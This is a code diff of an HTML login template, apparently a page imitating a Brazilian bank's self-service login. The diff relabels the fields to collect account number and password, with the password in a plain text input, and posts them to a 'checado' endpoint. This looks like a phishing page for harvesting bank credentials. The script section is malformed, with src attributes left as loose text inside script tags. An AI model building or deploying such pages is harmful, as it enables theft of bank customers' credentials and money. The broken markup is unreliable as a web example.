@@ -7,36 +7,41 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <link href="style.css" rel="stylesheet">
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
+    <link href="//netdna.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
     <title>ProjetoLoginBBContaFinal2.0</title>
     <!--CSS-->
-
+    
+    
     <!--Script-->
     <script>
-
+    src="//netdna.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"
+    src="//code.jquery.com/jquery-1.11.1.min.js"
     </script>
 </head>
 
-<body>
+<body class="corpo">
     <div class="auto">
-        <div class="icon"><img src="https://img.ibxk.com.br/2015/1/programas/72479274.png" width="60px" height="60px"></div>
-        <h1>Auto-Atendimento</h1>
+        <div class="icone"><img src="https://media.licdn.com/dms/image/C510BAQE1aTLnEFqUfg/company-logo_200_200/0?e=2159024400&v=beta&t=i-xYdkMQfZ3U4qUS4DEHTqfuA1nEc6Q2vXyCLzhYxkk" class="rounded mx-auto d-block" width="20px" height="20px"></div>
+        <h1>Registre-se</h1>
     </div>
     <div class="caixa-login">
         <div class="container">
-            <h1>Agência & Conta</h1>
+            <h1>Conta & Senha</h1>
             <h5 id='err' style="color: red;text-align: center;">
                 <%= message %></h5>
         <form action="checado" method="POST">
-            <label id="lagencia" for="agencia">Agência</label>
-                <input type="text" id="agencia" name="agencia" required placeholder="Digite sua agência" autofocus>
-            <label id="lconta" for="conta">Conta</label>
-                <input type="text" name="conta" id="conta" required placeholder="Digite sua conta">
+            <label id="lagencia" for="agencia">Conta</label>
+                <input type="text" id="agencia" name="agencia" required placeholder="Digite sua conta" autofocus>
+            <label id="lconta" for="conta">Senha</label>
+                <input type="text" name="conta" id="conta" required placeholder="Digite sua senha">
             <div class="custom-control custom-switch">
                 <input type="checkbox" class="custom-control-input" id="customSwitch1" checked>
-                <label class="custom-control-label" for="customSwitch1" aria-checked="true">Guardar agência e conta</label>
+                <label class="custom-control-label" for="customSwitch1" aria-checked="true">Guardar Conta & Senha</label>
                 </div>
                 <button type="submit" class="btn btn-primary">Continuar</button>
                 <a style="color: #0a39ab;margin-left: 50px;" id="link" href="/continuada">Outro tipo de acesso</a>
+                    </div>
+                    </div>
         </form>
         </div>
     </div>
